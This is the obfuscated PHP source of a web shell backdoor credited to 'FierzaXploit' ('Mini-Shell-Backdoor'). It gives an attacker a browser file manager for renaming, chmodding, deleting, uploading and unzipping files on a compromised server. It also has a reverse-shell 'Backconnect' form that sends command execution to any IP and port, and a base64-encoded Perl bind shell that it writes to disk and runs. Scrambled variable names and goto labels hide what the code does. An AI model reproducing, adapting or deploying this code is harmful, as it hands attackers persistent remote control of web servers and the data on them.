		${${"GLOBALS"}["uvjslbqupilo"]} .= ${${"GLOBALS"}["ctycbl"]} & 256 ? "r" : "-";
		$ertbtlogu = "perms";
		${${"GLOBALS"}["bldxzykl"]} .= ${$jsqokv} & 128 ? "w" : "-";
		${"GLOBALS"}["emnfcjcrsn"] = "perms";
		${$dqwowaa} .= ${${"GLOBALS"}["ctycbl"]} & 64 ? ${$ndyurkkvxe} & 2048 ? "s" : "x" : (${${"GLOBALS"}["nidnjmyj"]} & 2048 ? "S" : "-");
		${${"GLOBALS"}["uvjslbqupilo"]} .= ${${"GLOBALS"}["ctycbl"]} & 32 ? "r" : "-";
		${${"GLOBALS"}["ooelsib"]} .= ${${"GLOBALS"}["emnfcjcrsn"]} & 16 ? "w" : "-";
		${${"GLOBALS"}["riwnbas"]} .= ${${"GLOBALS"}["ctycbl"]} & 8 ? ${$jfmrnfgsglwr} & 1024 ? "s" : "x" : (${$ertbtlogu} & 1024 ? "S" : "-");
		${${"GLOBALS"}["uvjslbqupilo"]} .= ${${"GLOBALS"}["ctycbl"]} & 4 ? "r" : "-";
		${"GLOBALS"}["tcjagwx"] = "perms";
		${${"GLOBALS"}["tqoiul"]} .= ${${"GLOBALS"}["tcjagwx"]} & 2 ? "w" : "-";
		${${"GLOBALS"}["spywtyo"]} .= ${${"GLOBALS"}["ctycbl"]} & 1 ? ${${"GLOBALS"}["ctycbl"]} & 512 ? "t" : "x" : (${${"GLOBALS"}["jwwyctllfob"]} & 512 ? "T" : "-");
		return ${${"GLOBALS"}["uvjslbqupilo"]};
	}
	if ($_GET["aksi"] == "chmod") {
		if (isset($_POST["ganti"])) {
			if (chmod($_GET["nama_file"], $_POST["perm"])) {
				${"GLOBALS"}["krpdobnpgnca"] = "path";
				echo "<script>Swal.fire(\n 'Berhasil',\n 'Permission Sukses Diganti',\n 'success'\n );window.location='?path=" . ${${"GLOBALS"}["krpdobnpgnca"]} . "';</script>";
			} else {
				${"GLOBALS"}["dybjdxm"] = "path";
				echo "<script>Swal.fire(\n 'Gagal',\n 'Permission Gagal Diganti',\n 'error'\n );window.location='?path=" . ${${"GLOBALS"}["dybjdxm"]} . "';</script>";
			}
		}
		echo "<div class=\"alert\"><center><h4 class=\"text-white\">{Ganti Permission }</h4></center> <form method=\"POST\"> <div class=\"mb-3\"> <label for=\"exampleFormControlInput1\" class=\"text-white form-label\">Permission :</label> <input type=\"text\" name=\"perm\" value=\"" . substr(sprintf("%o", fileperms($_GET["dirf"])), -4) . "\" class=\"form-control\" id=\"exampleFormControlInput1\" placeholder=\"name@example.com\"> </div> <br> <button type=\"submit\" name=\"ganti\" class=\"tombol btn btn-outline-success\">Ganti Permission</button> </form> <br> <button type=\"button\" class=\"tombol btn btn-danger\" data-bs-dismiss=\"alert\" aria-label=\"Close\">Cancel</button> </div>";
	}
	echo "<br><div class=\"table-responsive-sm\"><table class=\"table table-borderless table-dark table-hover table-sm\"><thead><tr><th scope=\"col-\">Type</th><th scope=\"col\">Name</th><th scope=\"col\">Size</th><th scope=\"col\">Last Modified</th><th scope=\"col\">Permission</th><th scope=\"col\">options</th></tr></thead><tbody>";
	foreach (${$sieknty} as ${${"GLOBALS"}["vcavekxuioq"]}) {
		${"GLOBALS"}["pgpjkohmpw"] = "direktori";
		${"GLOBALS"}["riecvnlnrwd"] = "direktori";
		if (${${"GLOBALS"}["pgpjkohmpw"]} != "." && ${${"GLOBALS"}["riecvnlnrwd"]} != "..") {
			${"GLOBALS"}["rsketick"] = "direktori";
			if (is_dir(${${"GLOBALS"}["rsketick"]})) {
				$ukgfrgu = "direktori";
				${"GLOBALS"}["vzcluu"] = "direktori";
				${"GLOBALS"}["hpdbrlomynno"] = "path";
				$hxouty = "direktori";
				$novhagcxzhs = "direktori";
				${"GLOBALS"}["ufjsynwxdty"] = "direktori";
				${"GLOBALS"}["xuhyegjwtxv"] = "path";
				${"GLOBALS"}["gkjwasui"] = "direktori";
				${"GLOBALS"}["rmdcymmzexra"] = "direktori";
				${"GLOBALS"}["orusiptsi"] = "path";
				${"GLOBALS"}["jyudxhkrwa"] = "path";
				$ohhnxne = "direktori";
				$kjstot = "path";
				echo "<tr>\n <th scope=\"row\"><font size='5'><i class=\"bi bi-folder-fill\"></i></font></th>\n <td><a class=\"path\" nama='filenya' href=\"?path=" . ${${"GLOBALS"}["xuhyegjwtxv"]} . "/" . ${${"GLOBALS"}["rmdcymmzexra"]} . "\">" . ${${"GLOBALS"}["vcavekxuioq"]} . "</a></td>\n <td><i class=\"bi bi-dash-lg\"></i></td>\n <td>" . date("d F Y H:i:s.", filemtime(${${"GLOBALS"}["vzcluu"]})) . "</td>\n <td>";
				$vftrdg = "path";
				${"GLOBALS"}["mshidjok"] = "direktori";
				if (is_writable(${${"GLOBALS"}["msrlygrv"]} . "/" . ${${"GLOBALS"}["vcavekxuioq"]})) {
					echo "<font color=\"#2EFF00\">";
				} elseif (!is_readable(${${"GLOBALS"}["jyudxhkrwa"]} . "/" . ${${"GLOBALS"}["vcavekxuioq"]})) {
					echo "<font color=\"#FF5733\">";
				}
				echo perms(${${"GLOBALS"}["msrlygrv"]} . "/" . ${${"GLOBALS"}["ufjsynwxdty"]});
				if (is_writable(${${"GLOBALS"}["hpdbrlomynno"]} . "/" . ${$novhagcxzhs}) || !is_readable(${${"GLOBALS"}["orusiptsi"]} . "/" . ${$hxouty})) {
					echo "</font>";
				}
				echo "</td>\n <td>\n <a href='?path=" . ${${"GLOBALS"}["msrlygrv"]} . "&aksi=rename&dirf=" . ${${"GLOBALS"}["msrlygrv"]} . "/" . ${${"GLOBALS"}["vcavekxuioq"]} . "&nama_file=" . ${$ukgfrgu} . "' class=\"btn btn-outline-warning\" data-bs-toggle=\"tooltip\" data-bs-placement=\"top\" title=\"Rename Folder\"><i class=\"bi bi-pencil\"></i></a>\n <a href='?path=" . ${$vftrdg} . "&aksi=chmod&dirf=" . ${${"GLOBALS"}["msrlygrv"]} . "/" . ${${"GLOBALS"}["vcavekxuioq"]} . "&nama_file=" . ${$ohhnxne} . "' class=\"btn btn-outline-light\" data-bs-toggle=\"tooltip\" data-bs-placement=\"top\" title=\"Chmod Folder\"><i class=\"bi bi-cursor-fill\"></i></a>\n <a href='?path=" . ${${"GLOBALS"}["msrlygrv"]} . "&aksi=delete&dirf=" . ${$kjstot} . "/" . ${${"GLOBALS"}["gkjwasui"]} . "&nama_file=" . ${${"GLOBALS"}["mshidjok"]} . "' class=\"btn btn-outline-danger\"><i class=\"bi bi-trash-fill\" data-bs-toggle=\"tooltip\" data-bs-placement=\"top\" title=\"Delete Folder\"></i></a>\n </td>\n </tr>";
			}
		}
	}
	function fsize($file)
	{
		$ersphzqrie = "size";
		${"GLOBALS"}["kpombf"] = "size";
		${${"GLOBALS"}["kcobuyr"]} = array("B", "KB", "MB", "GB", "TB", "PB");
		${${"GLOBALS"}["nfgnsboqp"]} = 0;
		${${"GLOBALS"}["epexvt"]} = filesize(${${"GLOBALS"}["dodrwd"]});
		while (${$ersphzqrie} >= 1024) {
			$rquxyvvvj = "pos";
			$sbrztgptotms = "size";
			${$sbrztgptotms} /= 1024;
			${$rquxyvvvj}++;
		}
		$xpiutrijd = "a";
		return round(${${"GLOBALS"}["kpombf"]}, 2) . " " . ${$xpiutrijd}[${${"GLOBALS"}["nfgnsboqp"]}];
	}
	foreach (${${"GLOBALS"}["nrtuxdkfwbfs"]} as ${$hpumfihpd}) {
		$lwuxvtv = "file";
		if (${$lwuxvtv} != "." && ${${"GLOBALS"}["dodrwd"]} != "..") {
			$iyltgmfk = "file";
			if (is_file(${$iyltgmfk})) {
				$zcjfsf = "path";
				$bnslmche = "file";
				$hhkpidd = "path";
				$axcgqfnhxvlb = "file";
				${"GLOBALS"}["mwbxqwet"] = "path";
				$timxrzgbs = "file";
				echo "<tr>\n <th scope=\"row\"><font size='5'><i class=\"bi bi-file-earmark-code-fill\"></i></font></th>\n <td>\n <a class=\"path\" nama='filenya' href=\"?path=" . ${${"GLOBALS"}["mwbxqwet"]} . "&aksi=view&path_file=" . ${${"GLOBALS"}["msrlygrv"]} . "/" . ${${"GLOBALS"}["dodrwd"]} . "\">" . ${${"GLOBALS"}["dodrwd"]} . "</a>\n </td>\n <td>" . fsize(${${"GLOBALS"}["dodrwd"]}) . "</td>\n <td>" . date("d F Y H:i:s", filemtime(${${"GLOBALS"}["dodrwd"]})) . "</td>\n <td>";
				${"GLOBALS"}["aqqfdarmohy"] = "path";
				$dlwojt = "file";
				$nawpstugrd = "file";
				${"GLOBALS"}["cwaayeme"] = "path";
				${"GLOBALS"}["soswfdomfdrg"] = "file";
				if (is_writable(${${"GLOBALS"}["msrlygrv"]} . "/" . ${$nawpstugrd})) {
					echo "<font color=\"#2EFF00\">";
				} elseif (!is_readable(${${"GLOBALS"}["msrlygrv"]} . "/" . ${$timxrzgbs})) {
					echo "<font color=\"#FF5733\">";
				}
				${"GLOBALS"}["pmypxvpjq"] = "file";
				$ctioirlp = "file";
				echo perms(${${"GLOBALS"}["msrlygrv"]} . "/" . ${${"GLOBALS"}["soswfdomfdrg"]});
				if (is_writable(${${"GLOBALS"}["aqqfdarmohy"]} . "/" . ${${"GLOBALS"}["dodrwd"]}) || !is_readable(${${"GLOBALS"}["msrlygrv"]} . "/" . ${${"GLOBALS"}["dodrwd"]})) {
					echo "</font>";
				}
				echo "</td>\n <td>\n <a href='?path=" . ${${"GLOBALS"}["msrlygrv"]} . "&aksi=edit&dirf=" . ${${"GLOBALS"}["msrlygrv"]} . "/" . ${$dlwojt} . "&nama_file=" . ${$ctioirlp} . "' class=\"btn btn-outline-success\" data-bs-toggle=\"tooltip\" data-bs-placement=\"top\" title=\"Edit File\"><i class=\"bi bi-pencil-square\"></i></a>\n <a href='?path=" . ${${"GLOBALS"}["cwaayeme"]} . "&aksi=rename&dirf=" . ${$zcjfsf} . "/" . ${$axcgqfnhxvlb} . "&nama_file=" . ${$bnslmche} . "' class=\"btn btn-outline-warning\" data-bs-toggle=\"tooltip\" data-bs-placement=\"top\" title=\"Rename File\"><i class=\"bi bi-pencil\"></i></a>\n <a href='?path=" . ${${"GLOBALS"}["msrlygrv"]} . "&aksi=chmod&dirf=" . ${${"GLOBALS"}["msrlygrv"]} . "/" . ${${"GLOBALS"}["dodrwd"]} . "&nama_file=" . ${${"GLOBALS"}["dodrwd"]} . "' class=\"btn btn-outline-light\"><i class=\"bi bi-cursor-fill\" data-bs-toggle=\"tooltip\" data-bs-placement=\"top\" title=\"Chmod File\"></i></a>\n <a href='?path=" . ${$hhkpidd} . "&aksi=delete&dirf=" . ${${"GLOBALS"}["msrlygrv"]} . "/" . ${${"GLOBALS"}["pmypxvpjq"]} . "&nama_file=" . ${${"GLOBALS"}["dodrwd"]} . "' class=\"btn btn-outline-danger\"><i class=\"bi bi-trash-fill\" data-bs-toggle=\"tooltip\" data-bs-placement=\"top\" title=\"Delete File\"></i></a>\n </td>\n </tr>";
			}
		}
	}
	if ($_GET["aksi"] == "delete") {
		if (is_dir($_GET["dirf"])) {
			${"GLOBALS"}["pzsmpqc"] = "path";
			if (is_writable(${${"GLOBALS"}["pzsmpqc"]})) {
				$etzqdnmjsh = "path";
				rmdir($_GET["nama_file"]);
				echo "<script>alert('Selamat Anda Berhasil Men-delete Folder');window.location='?path=" . ${$etzqdnmjsh} . "'</script>";
			} else {
				echo "<script>alert('Maaf Anda Gagal Men-delete Folder')</script>";
			}
		}
		if (is_file($_GET["dirf"])) {
			if (unlink($_GET["nama_file"])) {
				echo "<script>alert('Selamat Anda Berhasil Men-delete File');window.location='?path=" . ${${"GLOBALS"}["msrlygrv"]} . "';</script>";
			} else {
				${"GLOBALS"}["txuxggtsue"] = "path";
				echo "<script>alert('Maaf Anda Gagal Men-delete File');window.location='?path=" . ${${"GLOBALS"}["txuxggtsue"]} . "';</script>";
			}
		}
	}
	echo "</tbody></table><a href=\"#up\"><i class=\"bi bi-chevron-up up-icon\"></i></a></div><div class=\"mb-3 container-fluid\"><div class=\"row\"><div class=\"col-12 col-sm-6\"><h5 class=\"text-white text-center mt-4\"><b>- <i class=\"bi bi-broadcast-pin\"></i> Backconnect [ php ] -</b></h5><form method=\"POST\"><div class=\"mb-3\"><label class=\"text-white form-label\">IP Address :</label> <input class=\"form-control\"name=\"ip\"id=\"exampleFormControlInput1\"placeholder=\"127.0.0.1\"></div><div class=\"mb-3\"><label class=\"text-white form-label\">Port :</label> <input class=\"form-control\"name=\"port\"id=\"exampleFormControlInput1\"placeholder=\"1337\"></div><center><button class=\"btn btn-outline-light w-50\"type=\"submit\"name=\"conn\">Coonect Now</button></center></form>";
	if (isset($_POST["conn"])) {
		$fdsdanfqirv = "ip";
		${"GLOBALS"}["djxjjln"] = "sockfd";
		${"GLOBALS"}["yjccgrm"] = "port";
		${$fdsdanfqirv} = $_POST["ip"];
		${${"GLOBALS"}["bnispowp"]} = $_POST["port"];
		$ymkgcse = "errno";
		${${"GLOBALS"}["djxjjln"]} = fsockopen(${${"GLOBALS"}["rgtlwvactfmx"]}, ${${"GLOBALS"}["yjccgrm"]}, ${${"GLOBALS"}["xnavikjf"]}, ${${"GLOBALS"}["iggkdlq"]});
		if (${$ymkgcse} != 0) {
			$ugiqumd = "errno";
			${"GLOBALS"}["kllbtgyn"] = "errstr";
			echo "<div class=\"alert alert-danger alert-dismissible fade show\" role=\"alert\">\n <strong>" . ${$ugiqumd} . "</strong> : " . ${${"GLOBALS"}["kllbtgyn"]} . " <button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"alert\" aria-label=\"Close\"></button> </div><font color='red'>{$errno} : {$errstr}</font>";
		} else {
			if (!${${"GLOBALS"}["kwftkoivmvzn"]}) {
				${${"GLOBALS"}["vavayujug"]} = "<div class=\"alert alert-warning alert-dismissible fade show\" role=\"alert\"> <strong>Unexpected error has occured,</strong> Connection may have failed. <button type=\"button\" class=\"btn-close\" data-bs-dismiss=\"alert\" aria-label=\"Close\"></button> </div>";
			} else {
				${"GLOBALS"}["cprjwnedo"] = "sockfd";
				$qvpvkbrdhh = "time";
				fputs(${${"GLOBALS"}["cprjwnedo"]}, "[ + ] Berhasil Connect\n[ + ]Greetz : FierzaXploit / Mr.MF33\n");
				${"GLOBALS"}["luxrjjaahjc"] = "len";
				$ytmwxlrmylw = "time";
				${${"GLOBALS"}["rzmdrjj"]} = `pwd`;
				${${"GLOBALS"}["isqekurmr"]} = `uname-a`;
				${$qvpvkbrdhh} = `time`;
				${${"GLOBALS"}["luxrjjaahjc"]} = 1337;
				fputs(${${"GLOBALS"}["kwftkoivmvzn"]}, "User ", ${${"GLOBALS"}["isqekurmr"]}, "connected @ ", ${$ytmwxlrmylw}, "\n\n");
				while (!feof(${${"GLOBALS"}["kwftkoivmvzn"]})) {
					${"GLOBALS"}["ljiqeeuip"] = "command";
					$dubyrtder = "cmdPrompt";
					${"GLOBALS"}["nkdttfma"] = "len";
					${"GLOBALS"}["wltypbzc"] = "sockfd";
					${${"GLOBALS"}["dunsgshwov"]} = "[root@FX]#:> ";
					@fputs(${${"GLOBALS"}["wltypbzc"]}, ${$dubyrtder});
					${${"GLOBALS"}["ljiqeeuip"]} = fgets(${${"GLOBALS"}["kwftkoivmvzn"]}, ${${"GLOBALS"}["nkdttfma"]});
					@fputs(${${"GLOBALS"}["kwftkoivmvzn"]}, "\n" . `{${${"GLOBALS"}["cqogeqrmk"]}}` . "\n\n");
				}
				@fclose(${${"GLOBALS"}["kwftkoivmvzn"]});
			}
		}
	}
	echo "</div><div class=\"col-12 col-sm-6\"><div class=\"row\"><div class=\"col-12\"><br><h5 class=\"text-white text-center mt-4 mb-3\"><b>- <i class=\"bi bi-broadcast\"></i> Bind port to /bin/sh -</b></h5><form method=\"POST\"><div class=\"mb-3 input-group\"><span class=\"input-group-text\"id=\"basic-addon1\"><i class=\"bi bi-broadcast\"></i></span> <input class=\"form-control\"name=\"ports\"placeholder=\"31337\"aria-describedby=\"basic-addon1\"aria-label=\"Username\"> <button class=\"btn btn-outline-light\"type=\"submit\"name=\"reverse\"id=\"inputGroupFileAddon04\">Reverse Now</button></div></form>";
	if (isset($_POST["reverse"])) {
		${"GLOBALS"}["gcpsjhjwqk"] = "bp";
		${${"GLOBALS"}["gcpsjhjwqk"]} = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
		${"GLOBALS"}["unidqckuxbcy"] = "out";
		$xdgpyq = "brt";
		${${"GLOBALS"}["gcvobbdhs"]} = @fopen("bp.pl", "w");
		fwrite(${$xdgpyq}, ${${"GLOBALS"}["yvhqdgmtouw"]});
		${${"GLOBALS"}["unidqckuxbcy"]} = "perl bp.pl " . $_POST["ports"] . " 1>/dev/null 2>&1 &";
		${${"GLOBALS"}["vavayujug"]} = `{${${"GLOBALS"}["eegzodzoqzhf"]}}`;
		sleep(1);
		echo "<pre class='text-light'>{$result}\n" . `ps aux|grep bp.pl` . "</pre>";
		unlink("bp.pl");
	}
	echo "</div><div class=\"col-12\"><h5 class=\"text-white text-center\"><b>- <i class=\"bi bi-file-earmark-zip-fill\"></i> Unzip File -</b></h5><form method=\"POST\"enctype=\"multipart/form-data\"><div class=\"input-group\"><input class=\"form-control\"name=\"fzip\"id=\"inputGroupFile04\"type=\"file\"aria-describedby=\"inputGroupFileAddon04\"aria-label=\"Upload\"> <button class=\"btn btn-outline-light\"type=\"submit\"name=\"unzip\"id=\"inputGroupFileAddon04\">Upload & Unzip</button></div></form>";
	function Zip_Extrack($zip_files, $to_dir)
	{
		${${"GLOBALS"}["mgbcqcvinwd"]} = new ZipArchive();
		$xdvfxaptci = "zip_files";
		${${"GLOBALS"}["ahzgjerpuvf"]} = $zip->open(${$xdvfxaptci});
		if (${${"GLOBALS"}["ahzgjerpuvf"]} === TRUE) {
			${"GLOBALS"}["dituene"] = "name";
			$husive = "to_dir";
			$hdaqfxqqx = "name";
			$vmtwdmtu = "name";
			${$vmtwdmtu} = basename(${${"GLOBALS"}["gksfovkwb"]}, ".zip") . "_unzip";
			@mkdir(${$hdaqfxqqx});
			@$zip->extractTo(${$husive} . "/" . ${${"GLOBALS"}["dituene"]});
			return @$zip->close();
		} else {
			return false;
		}
	}
	if (isset($_POST["unzip"])) {
		${"GLOBALS"}["fzvguxhilpu"] = "filename";
		$iqymjy = "tmp";
		${"GLOBALS"}["veqanovg"] = "tmp";
		${${"GLOBALS"}["fzvguxhilpu"]} = $_FILES["fzip"]["name"];
		${$iqymjy} = $_FILES["fzip"]["tmp_name"];
		if (move_uploaded_file(${${"GLOBALS"}["veqanovg"]}, "{$path}/{$filename}")) {
			$ccstfcuh = "swa";
			$pghycxxeuxi = "filename";
			echo Zip_Extrack(${${"GLOBALS"}["pdheomdbyp"]}, ${${"GLOBALS"}["msrlygrv"]});
			unlink(${$pghycxxeuxi});
			${$ccstfcuh} = "success";
			${${"GLOBALS"}["tuyjcs"]} = "Berhasil Mengekstrak Zip";
			echo "<p class='text-white'>" . ${${"GLOBALS"}["tuyjcs"]} . "</p>";
		} else {
			echo "<b class='text-white'>Gagal!</b>";
		}
	}
	echo "</div></div></div></div></div><br><div class=\"footer\"data-aos=\"fade-up\"data-aos-anchor-placement=\"center-bottom\"><center>";
	echo "<font color='white' size='5'><a class='text-white text-decoration-none' href='https://github.com/FierzaEriez/Mini-Shell-Backdoor'><i class=\"bi bi-github\"></i></a> <i class=\"bi bi-facebook\"></i> <i class=\"bi bi-instagram\"></i></font><font color='white'><hr width='55%'></font><br><br><p class=\"info\">Design & Developed By FierzaXploit <br> Copyright &copy;";
	echo date("Y") . "</p>";
	echo "</center></div><br><script src=\"https://unpkg.com/aos@2.3.1/dist/aos.js\"></script><script src=\"//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js\"></script><script>AOS.init(),hljs.highlightAll()</script><script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js\"crossorigin=\"anonymous\"integrity=\"sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p\"></script></body></html>";
} else {
	loginan();
}
goto m7gzT;
h0BHh:
session_start();
goto H1mWi;
iwqPn:
@ini_set("error_log", 0);
goto h0BHh;
wcESS:
ob_start();
goto BA2Hy;
AEURk:
if (isset($_GET["path"])) {
	${"GLOBALS"}["lygyqhydymve"] = "path";
	${${"GLOBALS"}["lygyqhydymve"]} = htmlspecialchars($_GET["path"]);
} else {
	${${"GLOBALS"}["msrlygrv"]} = getcwd();
}
goto gqboS;
m7gzT:
